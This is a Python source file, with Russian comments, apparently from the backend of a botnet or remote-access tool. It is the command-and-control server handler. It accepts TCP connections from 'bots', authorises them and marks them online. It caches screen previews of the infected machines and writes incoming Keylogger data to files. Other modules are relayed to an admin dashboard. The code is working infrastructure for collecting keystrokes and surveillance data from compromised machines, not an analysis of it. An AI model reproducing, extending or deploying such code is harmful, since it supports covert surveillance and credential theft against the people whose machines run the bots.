# backend/Core/ClientConnection.py

import asyncio
import socket
from typing import Optional, Dict, Any, Tuple

import backend.LoggerWrapper as logger
from backend.Services.network import NetworkProtocol

# ИСПРАВЛЕННЫЕ ИМПОРТЫ:
# Авторизацию берем из Auth.py
from backend.Services.Auth import authorize_bot, sync_bot_data
# Хранилища берем из ClientManager.py
from backend.Services.ClientManager import active_clients, preview_cache

from backend.Services.SystemState import system_state
from backend.Services.FileManager import file_service
from backend.API.connection_manager import manager
from backend import add_bytes

class BotConnectionHandler:
    """
    Обработчик входящих TCP-соединений от ботов V8.0.
    """

    async def handle_new_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        bot_identifier: Optional[str] = None
        peer_address_info: Tuple[str, int] = writer.get_extra_info("peername")
        peer_host: str = peer_address_info[0]

        if (client_socket := writer.get_extra_info("socket")):
            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        try:
            # 1. Авторизация (теперь импортируется из Auth.py)
            auth_result = await authorize_bot(reader, peer_host)
            if not auth_result:
                return await self._force_close_stream(writer)

            bot_identifier, _ = auth_result
            active_clients[bot_identifier] = (reader, writer)
            
            sync_bot_data(bot_identifier, {"status": "online"})
            
            # Рассылка состояния админам
            manager.broadcast_packet_sync(system_state.get_global_update_packet())
            if (prev_packet := system_state.get_preview_packet(bot_identifier)):
                manager.broadcast_packet_sync(prev_packet)

            logger.Log.success(f"[Core] Bot connected: {bot_identifier}")

            # 4. Основной цикл
            while True:
                try:
                    packet_data = await asyncio.wait_for(
                        NetworkProtocol.read_packet(reader), 
                        timeout=45.0
                    )
                except asyncio.TimeoutError: 
                    break

                current_id, metadata, payload = packet_data
                if not current_id or metadata is None: break

                # Трафик
                p_size = 5 if metadata["type"] == "int" else len(payload)
                m_str = f"{metadata['module']}:{metadata['type']}:{metadata['action']}:{metadata['extra']}"
                add_bytes(8 + len(current_id) + len(m_str) + p_size)

                target_mod = metadata["module"]

                if target_mod == "SystemInfo":
                    sync_bot_data(current_id, payload)
                    manager.broadcast_packet_sync(system_state.get_global_update_packet())

                elif target_mod == "Preview":
                    if isinstance(payload, bytes) and payload:
                        preview_cache[current_id] = payload
                        if (p_pkt := system_state.get_preview_packet(current_id, payload)):
                            manager.broadcast_packet_sync(p_pkt)

                elif target_mod == "Keylogger":
                    if metadata["action"] == "START":
                        file_service.init_transfer(current_id, metadata["extra"], payload)
                    else:
                        await file_service.write_chunk(current_id, metadata["extra"], payload)

                elif target_mod == "Heartbeat":
                    if metadata["action"] == "PING":
                        res = NetworkProtocol.pack_packet(current_id, "Heartbeat", "str", "PONG", "none", "")
                        writer.write(res)
                        await writer.drain()

                else:
                    # Транзит всех остальных команд на фронтенд
                    transit = NetworkProtocol.pack_packet(
                        current_id, target_mod, metadata["type"], 
                        metadata["action"], metadata["extra"], payload
                    )
                    manager.broadcast_packet_sync(transit)

        except Exception as e:
            logger.Log.error(f"[Core] Handler error: {e}")
        finally:
            await self._terminate_bot_session(bot_identifier, writer)

    async def _terminate_bot_session(self, bot_id: Optional[str], writer: asyncio.StreamWriter) -> None:
        if bot_id and bot_id in active_clients:
            active_clients.pop(bot_id, None)
            sync_bot_data(bot_id, {"status": "offline"})
            # Оповещаем фронтенд об отключении
            manager.broadcast_packet_sync(system_state.get_global_update_packet())
            logger.Log.info(f"[Core] Bot {bot_id} offline")
        await self._force_close_stream(writer)

    async def _force_close_stream(self, writer: asyncio.StreamWriter) -> None:
        try:
            if not writer.transport.is_closing():
                writer.close()
                await writer.wait_closed()
        except: pass